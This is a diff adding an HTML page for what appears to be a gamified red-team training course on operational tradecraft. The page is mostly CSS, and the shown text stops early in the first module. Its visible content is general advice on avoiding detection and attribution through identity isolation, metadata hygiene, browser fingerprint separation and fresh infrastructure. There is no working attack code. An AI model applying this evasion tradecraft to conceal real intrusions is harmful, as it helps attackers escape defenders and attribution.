@@ -1,0 +1,2800 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>LEVEL 3 — Operational Tradecraft Command Center</title>
+<style>
+  :root {
+    --bg0: #080c10;
+    --bg1: #0d1117;
+    --bg2: #111820;
+    --bg3: #151e2a;
+    --bg4: #1a2436;
+    --panel: #0f1923;
+    --border: #1e3048;
+    --border2: #2a4060;
+    --cyan: #00d4ff;
+    --cyan2: #00a8cc;
+    --green: #00ff88;
+    --green2: #00c86a;
+    --red: #ff3860;
+    --red2: #cc2a48;
+    --amber: #ffb300;
+    --amber2: #cc8f00;
+    --purple: #9b59ff;
+    --purple2: #7a3ecc;
+    --text: #c8d8e8;
+    --text2: #7a9ab8;
+    --text3: #4a6a88;
+    --glow-c: rgba(0,212,255,0.15);
+    --glow-g: rgba(0,255,136,0.12);
+    --glow-r: rgba(255,56,96,0.15);
+    --font: 'Courier New', 'Consolas', monospace;
+  }
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+  html { scroll-behavior: smooth; }
+  body {
+    background: var(--bg0);
+    color: var(--text);
+    font-family: var(--font);
+    font-size: 13px;
+    line-height: 1.6;
+    overflow-x: hidden;
+  }
+  /* SCROLLBAR */
+  ::-webkit-scrollbar { width: 4px; }
+  ::-webkit-scrollbar-track { background: var(--bg1); }
+  ::-webkit-scrollbar-thumb { background: var(--border2); border-radius: 2px; }
+
+  /* GLOBAL ANIMATIONS */
+  @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:0.4} }
+  @keyframes glow-pulse { 0%,100%{box-shadow:0 0 8px var(--glow-c)} 50%{box-shadow:0 0 24px var(--glow-c),0 0 48px var(--glow-c)} }
+  @keyframes scan { 0%{transform:translateY(-100%)} 100%{transform:translateY(100vh)} }
+  @keyframes blink { 0%,100%{opacity:1} 49%{opacity:1} 50%{opacity:0} 99%{opacity:0} }
+  @keyframes flow { 0%{stroke-dashoffset:100} 100%{stroke-dashoffset:0} }
+  @keyframes fadeIn { from{opacity:0;transform:translateY(12px)} to{opacity:1;transform:translateY(0)} }
+  @keyframes slideRight { from{width:0} to{width:var(--w)} }
+  @keyframes ping { 0%{transform:scale(1);opacity:1} 100%{transform:scale(2.5);opacity:0} }
+  @keyframes rotate { from{transform:rotate(0deg)} to{transform:rotate(360deg)} }
+  @keyframes ticker { 0%{transform:translateX(0)} 100%{transform:translateX(-50%)} }
+  @keyframes node-appear { from{opacity:0;transform:scale(0)} to{opacity:1;transform:scale(1)} }
+  @keyframes data-flow { 0%{stroke-dashoffset:40} 100%{stroke-dashoffset:0} }
+
+  /* SCANLINE OVERLAY */
+  body::before {
+    content: '';
+    position: fixed;
+    top: 0; left: 0; right: 0; bottom: 0;
+    background: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0,0,0,0.06) 2px, rgba(0,0,0,0.06) 4px);
+    pointer-events: none;
+    z-index: 9999;
+  }
+
+  /* HEADER / MISSION CONTROL BAR */
+  #mission-bar {
+    position: fixed;
+    top: 0; left: 0; right: 0;
+    height: 52px;
+    background: linear-gradient(180deg, rgba(0,212,255,0.06) 0%, transparent 100%);
+    border-bottom: 1px solid var(--border);
+    display: flex;
+    align-items: center;
+    padding: 0 20px;
+    gap: 20px;
+    z-index: 1000;
+    backdrop-filter: blur(8px);
+  }
+  .mission-logo {
+    font-size: 11px;
+    color: var(--cyan);
+    letter-spacing: 4px;
+    text-transform: uppercase;
+    border: 1px solid var(--cyan2);
+    padding: 4px 10px;
+    position: relative;
+  }
+  .mission-logo::before {
+    content: '';
+    position: absolute;
+    top: -1px; left: -1px; right: -1px; bottom: -1px;
+    background: linear-gradient(90deg, var(--cyan) 0%, transparent 60%);
+    opacity: 0.08;
+  }
+  .mission-status {
+    display: flex;
+    align-items: center;
+    gap: 6px;
+    font-size: 11px;
+    color: var(--text2);
+    letter-spacing: 2px;
+  }
+  .status-dot {
+    width: 6px; height: 6px;
+    border-radius: 50%;
+    background: var(--green);
+    animation: pulse 2s infinite;
+    box-shadow: 0 0 8px var(--green);
+  }
+  .status-dot.red { background: var(--red); box-shadow: 0 0 8px var(--red); }
+  .status-dot.amber { background: var(--amber); box-shadow: 0 0 8px var(--amber); animation: none; }
+  .mission-ticker {
+    flex: 1;
+    overflow: hidden;
+    font-size: 11px;
+    color: var(--text3);
+    letter-spacing: 1px;
+  }
+  .ticker-inner {
+    white-space: nowrap;
+    animation: ticker 30s linear infinite;
+    display: inline-block;
+  }
+  .mission-xp {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    font-size: 11px;
+    color: var(--amber);
+    letter-spacing: 2px;
+  }
+  .xp-bar {
+    width: 80px; height: 4px;
+    background: var(--bg3);
+    border: 1px solid var(--border);
+    position: relative;
+    overflow: hidden;
+  }
+  .xp-fill {
+    height: 100%;
+    background: linear-gradient(90deg, var(--amber), var(--amber2));
+    transition: width 0.5s;
+  }
+
+  /* SIDE NAV */
+  #sidenav {
+    position: fixed;
+    left: 0; top: 52px; bottom: 0;
+    width: 200px;
+    background: var(--bg1);
+    border-right: 1px solid var(--border);
+    overflow-y: auto;
+    z-index: 900;
+    padding: 16px 0;
+  }
+  .nav-section-label {
+    font-size: 9px;
+    color: var(--text3);
+    letter-spacing: 3px;
+    text-transform: uppercase;
+    padding: 12px 16px 4px;
+  }
+  .nav-item {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    padding: 8px 16px;
+    cursor: pointer;
+    transition: all 0.2s;
+    border-left: 2px solid transparent;
+    font-size: 11px;
+    color: var(--text2);
+    letter-spacing: 1px;
+    position: relative;
+  }
+  .nav-item:hover { background: var(--bg2); color: var(--text); }
+  .nav-item.active { border-left-color: var(--cyan); color: var(--cyan); background: rgba(0,212,255,0.06); }
+  .nav-item.locked { opacity: 0.4; cursor: not-allowed; }
+  .nav-dot {
+    width: 5px; height: 5px;
+    border-radius: 50%;
+    background: var(--border2);
+    flex-shrink: 0;
+  }
+  .nav-item.active .nav-dot { background: var(--cyan); box-shadow: 0 0 6px var(--cyan); }
+  .nav-badge {
+    margin-left: auto;
+    font-size: 9px;
+    background: var(--red);
+    color: #fff;
+    padding: 1px 5px;
+    border-radius: 8px;
+  }
+
+  /* MAIN CONTENT */
+  #main-content {
+    margin-left: 200px;
+    margin-top: 52px;
+    min-height: calc(100vh - 52px);
+    padding: 24px;
+  }
+
+  /* SECTION WRAPPER */
+  .section-wrapper {
+    display: none;
+    animation: fadeIn 0.4s ease;
+  }
+  .section-wrapper.active { display: block; }
+
+  /* SECTION HEADER */
+  .section-header {
+    display: flex;
+    align-items: flex-start;
+    gap: 16px;
+    margin-bottom: 24px;
+    padding-bottom: 16px;
+    border-bottom: 1px solid var(--border);
+  }
+  .section-num {
+    font-size: 36px;
+    color: var(--border2);
+    line-height: 1;
+    letter-spacing: -2px;
+    font-weight: bold;
+  }
+  .section-title { font-size: 20px; color: var(--cyan); letter-spacing: 2px; text-transform: uppercase; }
+  .section-subtitle { font-size: 11px; color: var(--text2); letter-spacing: 2px; margin-top: 4px; }
+
+  /* GRID SYSTEMS */
+  .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; }
+  .grid-3 { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 16px; }
+  .grid-4 { display: grid; grid-template-columns: 1fr 1fr 1fr 1fr; gap: 12px; }
+  .grid-2-1 { display: grid; grid-template-columns: 2fr 1fr; gap: 16px; }
+  .grid-1-2 { display: grid; grid-template-columns: 1fr 2fr; gap: 16px; }
+
+  /* PANELS */
+  .panel {
+    background: var(--panel);
+    border: 1px solid var(--border);
+    padding: 16px;
+    position: relative;
+    overflow: hidden;
+  }
+  .panel::before {
+    content: '';
+    position: absolute;
+    top: 0; left: 0; right: 0;
+    height: 1px;
+    background: linear-gradient(90deg, transparent, var(--cyan), transparent);
+    opacity: 0.3;
+  }
+  .panel.green::before { background: linear-gradient(90deg, transparent, var(--green), transparent); }
+  .panel.red::before { background: linear-gradient(90deg, transparent, var(--red), transparent); }
+  .panel.amber::before { background: linear-gradient(90deg, transparent, var(--amber), transparent); }
+  .panel.purple::before { background: linear-gradient(90deg, transparent, var(--purple), transparent); }
+  .panel-title {
+    font-size: 10px;
+    color: var(--text3);
+    letter-spacing: 3px;
+    text-transform: uppercase;
+    margin-bottom: 12px;
+    display: flex;
+    align-items: center;
+    gap: 6px;
+  }
+  .panel-title::after {
+    content: '';
+    flex: 1;
+    height: 1px;
+    background: var(--border);
+  }
+
+  /* METRIC CARDS */
+  .metric-card {
+    background: var(--bg2);
+    border: 1px solid var(--border);
+    padding: 12px;
+    text-align: center;
+  }
+  .metric-value {
+    font-size: 28px;
+    font-weight: bold;
+    line-height: 1.1;
+    letter-spacing: -1px;
+  }
+  .metric-value.cyan { color: var(--cyan); text-shadow: 0 0 20px rgba(0,212,255,0.4); }
+  .metric-value.green { color: var(--green); text-shadow: 0 0 20px rgba(0,255,136,0.4); }
+  .metric-value.red { color: var(--red); text-shadow: 0 0 20px rgba(255,56,96,0.4); }
+  .metric-value.amber { color: var(--amber); text-shadow: 0 0 20px rgba(255,179,0,0.4); }
+  .metric-label { font-size: 9px; color: var(--text3); letter-spacing: 2px; text-transform: uppercase; margin-top: 4px; }
+
+  /* BUTTONS */
+  .btn {
+    background: transparent;
+    border: 1px solid var(--border2);
+    color: var(--text);
+    padding: 8px 16px;
+    font-family: var(--font);
+    font-size: 11px;
+    letter-spacing: 2px;
+    text-transform: uppercase;
+    cursor: pointer;
+    transition: all 0.2s;
+    position: relative;
+    overflow: hidden;
+  }
+  .btn::before {
+    content: '';
+    position: absolute;
+    inset: 0;
+    background: var(--cyan);
+    opacity: 0;
+    transition: opacity 0.2s;
+  }
+  .btn:hover { border-color: var(--cyan); color: var(--cyan); }
+  .btn:hover::before { opacity: 0.06; }
+  .btn.active, .btn:active { border-color: var(--cyan); background: rgba(0,212,255,0.1); color: var(--cyan); }
+  .btn.green-btn { border-color: var(--green2); color: var(--green); }
+  .btn.green-btn:hover { border-color: var(--green); }
+  .btn.red-btn { border-color: var(--red2); color: var(--red); }
+  .btn.amber-btn { border-color: var(--amber2); color: var(--amber); }
+
+  /* TAGS / BADGES */
+  .tag {
+    display: inline-block;
+    font-size: 9px;
+    letter-spacing: 2px;
+    text-transform: uppercase;
+    padding: 2px 8px;
+    border: 1px solid currentColor;
+  }
+  .tag.cyan { color: var(--cyan); border-color: rgba(0,212,255,0.4); background: rgba(0,212,255,0.06); }
+  .tag.green { color: var(--green); border-color: rgba(0,255,136,0.4); background: rgba(0,255,136,0.06); }
+  .tag.red { color: var(--red); border-color: rgba(255,56,96,0.4); background: rgba(255,56,96,0.06); }
+  .tag.amber { color: var(--amber); border-color: rgba(255,179,0,0.4); background: rgba(255,179,0,0.06); }
+  .tag.purple { color: var(--purple); border-color: rgba(155,89,255,0.4); background: rgba(155,89,255,0.06); }
+
+  /* TERMINAL */
+  .terminal {
+    background: #050a0e;
+    border: 1px solid var(--border);
+    padding: 12px;
+    font-family: var(--font);
+    font-size: 12px;
+    line-height: 1.8;
+    max-height: 220px;
+    overflow-y: auto;
+  }
+  .terminal-line { display: block; }
+  .t-prompt { color: var(--green); }
+  .t-cmd { color: var(--text); }
+  .t-output { color: var(--text2); }
+  .t-warn { color: var(--amber); }
+  .t-error { color: var(--red); }
+  .t-success { color: var(--green); }
+  .cursor { display: inline-block; width: 8px; height: 14px; background: var(--cyan); animation: blink 1s step-start infinite; vertical-align: middle; }
+
+  /* PROGRESS BAR */
+  .progress-bar {
+    height: 4px;
+    background: var(--bg3);
+    border: 1px solid var(--border);
+    overflow: hidden;
+    margin: 4px 0;
+  }
+  .progress-fill {
+    height: 100%;
+    transition: width 0.8s ease;
+  }
+  .progress-fill.cyan { background: var(--cyan); box-shadow: 0 0 8px rgba(0,212,255,0.6); }
+  .progress-fill.green { background: var(--green); box-shadow: 0 0 8px rgba(0,255,136,0.6); }
+  .progress-fill.red { background: var(--red); box-shadow: 0 0 8px rgba(255,56,96,0.6); }
+  .progress-fill.amber { background: var(--amber); box-shadow: 0 0 8px rgba(255,179,0,0.6); }
+
+  /* NETWORK GRAPH SVG */
+  .network-canvas {
+    background: var(--bg0);
+    border: 1px solid var(--border);
+    display: block;
+    width: 100%;
+  }
+
+  /* RISK INDICATOR */
+  .risk-ring {
+    display: inline-flex;
+    align-items: center;
+    justify-content: center;
+    width: 64px;
+    height: 64px;
+    border-radius: 50%;
+    border: 2px solid var(--border2);
+    font-size: 18px;
+    font-weight: bold;
+    position: relative;
+  }
+  .risk-ring.low { border-color: var(--green); color: var(--green); box-shadow: 0 0 16px rgba(0,255,136,0.3); }
+  .risk-ring.med { border-color: var(--amber); color: var(--amber); box-shadow: 0 0 16px rgba(255,179,0,0.3); }
+  .risk-ring.high { border-color: var(--red); color: var(--red); box-shadow: 0 0 16px rgba(255,56,96,0.3); animation: glow-pulse 2s infinite; }
+
+  /* INTEL CARD */
+  .intel-card {
+    border: 1px solid var(--border);
+    background: var(--bg2);
+    padding: 12px;
+    cursor: pointer;
+    transition: all 0.2s;
+    position: relative;
+  }
+  .intel-card:hover { border-color: var(--cyan); background: var(--bg3); }
+  .intel-card::before {
+    content: '';
+    position: absolute;
+    left: 0; top: 0; bottom: 0;
+    width: 3px;
+    background: var(--cyan);
+    opacity: 0;
+    transition: opacity 0.2s;
+  }
+  .intel-card:hover::before { opacity: 1; }
+  .intel-card.expanded::before { opacity: 1; }
+  .intel-card.red-card { border-color: rgba(255,56,96,0.3); }
+  .intel-card.red-card::before { background: var(--red); }
+  .intel-card.green-card::before { background: var(--green); }
+
+  /* TIMELINE */
+  .timeline { position: relative; padding-left: 20px; }
+  .timeline::before {
+    content: '';
+    position: absolute;
+    left: 6px; top: 0; bottom: 0;
+    width: 1px;
+    background: linear-gradient(180deg, var(--cyan), var(--border));
+  }
+  .timeline-item {
+    position: relative;
+    margin-bottom: 16px;
+    padding: 10px;
+    background: var(--bg2);
+    border: 1px solid var(--border);
+  }
+  .timeline-item::before {
+    content: '';
+    position: absolute;
+    left: -17px; top: 14px;
+    width: 8px; height: 8px;
+    border-radius: 50%;
+    background: var(--cyan);
+    border: 2px solid var(--bg0);
+    box-shadow: 0 0 8px var(--cyan);
+  }
+  .timeline-item.amber::before { background: var(--amber); box-shadow: 0 0 8px var(--amber); }
+  .timeline-item.red::before { background: var(--red); box-shadow: 0 0 8px var(--red); }
+  .timeline-time { font-size: 9px; color: var(--text3); letter-spacing: 2px; }
+  .timeline-content { font-size: 12px; color: var(--text); margin-top: 4px; }
+
+  /* EXPANDABLE */
+  .expandable-content {
+    max-height: 0;
+    overflow: hidden;
+    transition: max-height 0.4s ease;
+  }
+  .expandable-content.open { max-height: 600px; }
+
+  /* SLIDER */
+  input[type="range"] {
+    -webkit-appearance: none;
+    appearance: none;
+    height: 3px;
+    background: var(--bg3);
+    border: 1px solid var(--border);
+    outline: none;
+    cursor: pointer;
+  }
+  input[type="range"]::-webkit-slider-thumb {
+    -webkit-appearance: none;
+    width: 14px; height: 14px;
+    background: var(--cyan);
+    border-radius: 0;
+    box-shadow: 0 0 8px rgba(0,212,255,0.6);
+  }
+
+  /* ALERT BANNER */
+  .alert-banner {
+    background: rgba(255,56,96,0.1);
+    border: 1px solid var(--red2);
+    padding: 8px 12px;
+    font-size: 11px;
+    color: var(--red);
+    letter-spacing: 1px;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    margin-bottom: 12px;
+    animation: fadeIn 0.3s;
+  }
+  .alert-banner::before { content: '⚠'; font-size: 13px; }
+
+  /* SUCCESS BANNER */
+  .success-banner {
+    background: rgba(0,255,136,0.08);
+    border: 1px solid var(--green2);
+    padding: 8px 12px;
+    font-size: 11px;
+    color: var(--green);
+    letter-spacing: 1px;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    margin-bottom: 12px;
+    animation: fadeIn 0.3s;
+  }
+  .success-banner::before { content: '✓'; font-size: 13px; }
+
+  /* OPTION BUTTONS for decision panels */
+  .option-btn {
+    width: 100%;
+    text-align: left;
+    padding: 10px 12px;
+    background: var(--bg2);
+    border: 1px solid var(--border);
+    color: var(--text);
+    font-family: var(--font);
+    font-size: 12px;
+    cursor: pointer;
+    transition: all 0.2s;
+    margin-bottom: 6px;
+    letter-spacing: 0.5px;
+  }
+  .option-btn:hover { border-color: var(--cyan); color: var(--cyan); background: rgba(0,212,255,0.04); }
+  .option-btn.correct { border-color: var(--green); color: var(--green); background: rgba(0,255,136,0.06); }
+  .option-btn.wrong { border-color: var(--red); color: var(--red); background: rgba(255,56,96,0.06); }
+  .option-btn.neutral { border-color: var(--amber); color: var(--amber); background: rgba(255,179,0,0.06); }
+
+  /* NODE INFRA */
+  .infra-node {
+    display: inline-flex;
+    flex-direction: column;
+    align-items: center;
+    gap: 4px;
+    cursor: pointer;
+    transition: all 0.2s;
+  }
+  .node-circle {
+    width: 44px; height: 44px;
+    border-radius: 50%;
+    border: 2px solid var(--border2);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 16px;
+    background: var(--bg2);
+    transition: all 0.2s;
+    position: relative;
+  }
+  .node-circle::after {
+    content: '';
+    position: absolute;
+    inset: -4px;
+    border-radius: 50%;
+    border: 1px solid transparent;
+    transition: all 0.3s;
+  }
+  .infra-node:hover .node-circle { border-color: var(--cyan); box-shadow: 0 0 16px rgba(0,212,255,0.4); }
+  .infra-node:hover .node-circle::after { border-color: rgba(0,212,255,0.3); }
+  .infra-node.active .node-circle { border-color: var(--green); box-shadow: 0 0 16px rgba(0,255,136,0.4); }
+  .infra-node.compromised .node-circle { border-color: var(--red); animation: glow-pulse 1.5s infinite; }
+  .node-label { font-size: 9px; color: var(--text3); letter-spacing: 1px; text-align: center; max-width: 64px; }
+
+  /* ROLE CARD */
+  .role-card {
+    padding: 14px;
+    background: var(--bg2);
+    border: 1px solid var(--border);
+    cursor: pointer;
+    transition: all 0.2s;
+    text-align: center;
+  }
+  .role-card:hover { border-color: var(--cyan); }
+  .role-card.selected { border-color: var(--cyan); background: rgba(0,212,255,0.06); }
+  .role-icon { font-size: 28px; margin-bottom: 8px; }
+  .role-name { font-size: 11px; color: var(--cyan); letter-spacing: 2px; text-transform: uppercase; }
+  .role-desc { font-size: 10px; color: var(--text2); margin-top: 4px; }
+
+  /* DATA TABLE */
+  .data-table { width: 100%; border-collapse: collapse; }
+  .data-table th {
+    font-size: 9px;
+    letter-spacing: 2px;
+    text-transform: uppercase;
+    color: var(--text3);
+    padding: 6px 8px;
+    border-bottom: 1px solid var(--border);
+    text-align: left;
+  }
+  .data-table td {
+    font-size: 11px;
+    color: var(--text);
+    padding: 6px 8px;
+    border-bottom: 1px solid rgba(30,48,72,0.5);
+  }
+  .data-table tr:hover td { background: rgba(0,212,255,0.03); }
+
+  /* SEPARATOR */
+  .sep { height: 1px; background: var(--border); margin: 20px 0; }
+
+  /* ALERT NOTIFICATION */
+  #alert-container {
+    position: fixed;
+    bottom: 20px;
+    right: 20px;
+    z-index: 2000;
+    display: flex;
+    flex-direction: column;
+    gap: 8px;
+    max-width: 300px;
+  }
+  .alert-notif {
+    background: var(--bg1);
+    border: 1px solid var(--red);
+    padding: 10px 14px;
+    font-size: 11px;
+    color: var(--text);
+    animation: fadeIn 0.3s ease;
+    position: relative;
+  }
+  .alert-notif.green { border-color: var(--green); }
+  .alert-notif.amber { border-color: var(--amber); }
+  .alert-notif-close { position: absolute; top: 6px; right: 8px; cursor: pointer; color: var(--text3); }
+
+  /* CYBER EFFECT ELEMENTS */
+  .hex-decoration {
+    position: absolute;
+    right: -40px; top: 50%;
+    transform: translateY(-50%);
+    width: 120px; height: 120px;
+    opacity: 0.04;
+    pointer-events: none;
+  }
+
+  /* LOADING SPINNER */
+  .spinner {
+    display: inline-block;
+    width: 16px; height: 16px;
+    border: 2px solid var(--border2);
+    border-top-color: var(--cyan);
+    border-radius: 50%;
+    animation: rotate 0.8s linear infinite;
+  }
+
+  /* mb utility */
+  .mb8 { margin-bottom: 8px; }
+  .mb12 { margin-bottom: 12px; }
+  .mb16 { margin-bottom: 16px; }
+  .mb20 { margin-bottom: 20px; }
+  .mb24 { margin-bottom: 24px; }
+  .mt8 { margin-top: 8px; }
+  .mt12 { margin-top: 12px; }
+  .mt16 { margin-top: 16px; }
+
+  /* flex utils */
+  .flex { display: flex; }
+  .flex-col { flex-direction: column; }
+  .items-center { align-items: center; }
+  .justify-between { justify-content: space-between; }
+  .gap4 { gap: 4px; }
+  .gap8 { gap: 8px; }
+  .gap12 { gap: 12px; }
+  .gap16 { gap: 16px; }
+
+  .text-cyan { color: var(--cyan); }
+  .text-green { color: var(--green); }
+  .text-red { color: var(--red); }
+  .text-amber { color: var(--amber); }
+  .text-purple { color: var(--purple); }
+  .text-muted { color: var(--text2); }
+  .text-dim { color: var(--text3); }
+  .text-sm { font-size: 11px; }
+  .text-xs { font-size: 10px; }
+
+  /* OODA Wheel */
+  .ooda-phase {
+    padding: 12px;
+    background: var(--bg2);
+    border: 1px solid var(--border);
+    transition: all 0.3s;
+    text-align: center;
+    cursor: pointer;
+  }
+  .ooda-phase.active-phase {
+    border-color: var(--cyan);
+    background: rgba(0,212,255,0.08);
+    box-shadow: inset 0 0 20px rgba(0,212,255,0.05);
+  }
+  .ooda-letter {
+    font-size: 28px;
+    font-weight: bold;
+    letter-spacing: -1px;
+  }
+  .ooda-phase.active-phase .ooda-letter { color: var(--cyan); text-shadow: 0 0 20px rgba(0,212,255,0.6); }
+
+  /* Threat actor card */
+  .threat-card {
+    padding: 14px;
+    border: 1px solid var(--border);
+    background: var(--bg2);
+    cursor: pointer;
+    transition: all 0.2s;
+  }
+  .threat-card:hover, .threat-card.selected { border-color: var(--red); }
+  .threat-card.selected { background: rgba(255,56,96,0.06); }
+  .threat-name { font-size: 13px; color: var(--red); letter-spacing: 1px; margin-bottom: 6px; }
+  .threat-meta { font-size: 10px; color: var(--text2); }
+
+  /* Evidence log */
+  .evidence-item {
+    display: flex;
+    gap: 10px;
+    padding: 8px;
+    background: var(--bg2);
+    border: 1px solid var(--border);
+    margin-bottom: 6px;
+    font-size: 11px;
+  }
+  .evidence-hash { color: var(--text3); font-size: 9px; letter-spacing: 1px; font-family: monospace; }
+
+  /* SECTION-1 OPSEC */
+  .opsec-meter {
+    height: 8px;
+    background: var(--bg3);
+    border: 1px solid var(--border);
+    position: relative;
+    overflow: hidden;
+    margin: 4px 0;
+  }
+  .opsec-meter-fill {
+    height: 100%;
+    transition: width 0.5s;
+    position: relative;
+  }
+  .opsec-meter-fill::after {
+    content: '';
+    position: absolute;
+    right: 0; top: 0; bottom: 0;
+    width: 4px;
+    background: rgba(255,255,255,0.4);
+    animation: pulse 1s infinite;
+  }
+
+  @media (max-width: 900px) {
+    #sidenav { width: 160px; }
+    #main-content { margin-left: 160px; }
+    .grid-3 { grid-template-columns: 1fr 1fr; }
+    .grid-4 { grid-template-columns: 1fr 1fr; }
+  }
+</style>
+</head>
+<body>
+
+<!-- MISSION CONTROL BAR -->
+<div id="mission-bar">
+  <div class="mission-logo">LVL-3 // OPSEC</div>
+  <div class="mission-status">
+    <div class="status-dot" id="mission-dot"></div>
+    <span id="mission-status-text">MISSION ACTIVE</span>
+  </div>
+  <div class="mission-ticker">
+    <span class="ticker-inner">
+      ▸ C2 BEACON ACTIVE — INTERVAL: 45S &nbsp;&nbsp;&nbsp; ▸ REDIRECTOR NODE EU-3 ONLINE &nbsp;&nbsp;&nbsp; ▸ EDR SIGNATURE UPDATE DETECTED &nbsp;&nbsp;&nbsp; ▸ OPSEC LEVEL: ELEVATED &nbsp;&nbsp;&nbsp; ▸ CAMPAIGN PHASE: EXPLOITATION &nbsp;&nbsp;&nbsp; ▸ OPERATOR: [REDACTED] &nbsp;&nbsp;&nbsp; ▸ OBJECTIVE: PRIMARY TARGET COMPROMISED &nbsp;&nbsp;&nbsp; ▸ DECONFLICTION: VERIFIED &nbsp;&nbsp;&nbsp; ▸ C2 BEACON ACTIVE — INTERVAL: 45S &nbsp;&nbsp;&nbsp; ▸ REDIRECTOR NODE EU-3 ONLINE &nbsp;&nbsp;&nbsp; ▸ EDR SIGNATURE UPDATE DETECTED &nbsp;&nbsp;&nbsp; ▸ OPSEC LEVEL: ELEVATED
+    </span>
+  </div>
+  <div class="mission-xp">
+    <span>XP</span>
+    <div class="xp-bar"><div class="xp-fill" id="xp-fill" style="width:0%"></div></div>
+    <span id="xp-display">0</span>
+  </div>
+</div>
+
+<!-- SIDE NAV -->
+<nav id="sidenav">
+  <div class="nav-section-label">Modules</div>
+  <div class="nav-item active" onclick="showSection('s1')" data-section="s1">
+    <div class="nav-dot"></div>01 OPSEC
+  </div>
+  <div class="nav-item" onclick="showSection('s2')" data-section="s2">
+    <div class="nav-dot"></div>02 INFRASTRUCTURE
+  </div>
+  <div class="nav-item" onclick="showSection('s3')" data-section="s3">
+    <div class="nav-dot"></div>03 EVASION
+  </div>
+  <div class="nav-item" onclick="showSection('s4')" data-section="s4">
+    <div class="nav-dot"></div>04 CAMPAIGN
+  </div>
+  <div class="nav-item" onclick="showSection('s5')" data-section="s5">
+    <div class="nav-dot"></div>05 TEAM OPS
+  </div>
+  <div class="nav-item" onclick="showSection('s6')" data-section="s6">
+    <div class="nav-dot"></div>06 ACCESS MGMT
+  </div>
+  <div class="nav-item" onclick="showSection('s7')" data-section="s7">
+    <div class="nav-dot"></div>07 DECISIONS
+  </div>
+  <div class="nav-item" onclick="showSection('s8')" data-section="s8">
+    <div class="nav-dot"></div>08 EVIDENCE
+  </div>
+  <div class="nav-item" onclick="showSection('s9')" data-section="s9">
+    <div class="nav-dot"></div>09 ADV. EMULATION
+  </div>
+  <div class="nav-section-label" style="margin-top:12px">Status</div>
+  <div style="padding:8px 16px">
+    <div class="text-xs text-dim mb8">Completion</div>
+    <div class="progress-bar mb4"><div class="progress-fill cyan" id="completion-bar" style="width:0%"></div></div>
+    <div class="text-xs text-muted" id="completion-text">0 / 9 modules</div>
+  </div>
+</nav>
+
+<!-- MAIN CONTENT -->
+<div id="main-content">
+
+<!-- ============ SECTION 1: OPSEC ============ -->
+<div id="s1" class="section-wrapper active">
+  <div class="section-header">
+    <div class="section-num">01</div>
+    <div>
+      <div class="section-title">OPSEC Fundamentals</div>
+      <div class="section-subtitle">OPERATIONAL SECURITY · IDENTITY ISOLATION · PATTERN ANALYSIS · RISK SCORING</div>
+    </div>
+  </div>
+
+  <!-- Tactical Brief -->
+  <div class="panel mb16">
+    <div class="panel-title">Tactical Brief</div>
+    <div class="text-sm text-muted" style="max-width:720px">
+      OPSEC is the discipline of denying adversaries the information they need to detect, identify, or attribute your operations. Every operational mistake leaves a trace — the goal is to minimize exposure across all dimensions: identity, infrastructure, behavior, and timing.
+    </div>
+  </div>
+
+  <!-- Risk Metrics -->
+  <div class="grid-4 mb16">
+    <div class="metric-card">
+      <div class="metric-value green" id="opsec-score">94</div>
+      <div class="metric-label">OPSEC Score</div>
+    </div>
+    <div class="metric-card">
+      <div class="metric-value amber" id="detect-prob">12%</div>
+      <div class="metric-label">Detect Probability</div>
+    </div>
+    <div class="metric-card">
+      <div class="metric-value cyan" id="identity-sep">ISOLATED</div>
+      <div class="metric-label">Identity Status</div>
+    </div>
+    <div class="metric-card">
+      <div class="metric-value red" id="infra-leaks">0</div>
+      <div class="metric-label">Active Leaks</div>
+    </div>
+  </div>
+
+  <div class="grid-2 mb16">
+    <!-- Identity Isolation Simulator -->
+    <div class="panel">
+      <div class="panel-title">Identity Isolation Simulator</div>
+      <div class="text-xs text-dim mb12">Toggle each vector to see exposure impact</div>
+      <div id="opsec-controls">
+        <div class="intel-card mb8" id="opsec-personal-acct">
+          <div class="flex items-center justify-between mb4">
+            <span class="text-sm">Personal Account Crossover</span>
+            <span class="tag red" id="tag-personal">ACTIVE</span>
+          </div>
+          <div class="progress-bar mb4"><div class="opsec-meter-fill progress-fill red" style="width:78%"></div></div>
+          <div class="text-xs text-dim">Reusing personal email in op context — HIGH correlation risk</div>
+          <button class="btn red-btn mt8" onclick="toggleOpsecVector('personal')" style="font-size:10px;padding:4px 10px">TOGGLE VECTOR</button>
+        </div>
+        <div class="intel-card mb8" id="opsec-metadata">
+          <div class="flex items-center justify-between mb4">
+            <span class="text-sm">Metadata Leakage</span>
+            <span class="tag amber" id="tag-meta">PARTIAL</span>
+          </div>
+          <div class="progress-bar mb4"><div class="opsec-meter-fill progress-fill amber" style="width:45%"></div></div>
+          <div class="text-xs text-dim">Document metadata, EXIF data, timezone signatures detected</div>
+          <button class="btn amber-btn mt8" onclick="toggleOpsecVector('metadata')" style="font-size:10px;padding:4px 10px">TOGGLE VECTOR</button>
+        </div>
+        <div class="intel-card mb8" id="opsec-browser">
+          <div class="flex items-center justify-between mb4">
+            <span class="text-sm">Browser Fingerprint Leak</span>
+            <span class="tag green" id="tag-browser">CLEAN</span>
+          </div>
+          <div class="progress-bar mb4"><div class="opsec-meter-fill progress-fill green" style="width:8%"></div></div>
+          <div class="text-xs text-dim">Isolated browser profile active. No cross-contamination.</div>
+          <button class="btn green-btn mt8" onclick="toggleOpsecVector('browser')" style="font-size:10px;padding:4px 10px">TOGGLE VECTOR</button>
+        </div>
+        <div class="intel-card" id="opsec-infra-reuse">
+          <div class="flex items-center justify-between mb4">
+            <span class="text-sm">Infrastructure Reuse</span>
+            <span class="tag green" id="tag-infra">CLEAN</span>
+          </div>
+          <div class="progress-bar mb4"><div class="opsec-meter-fill progress-fill green" style="width:5%"></div></div>
+          <div class="text-xs text-dim">Fresh infrastructure deployed per operation. No IP overlap.</div>
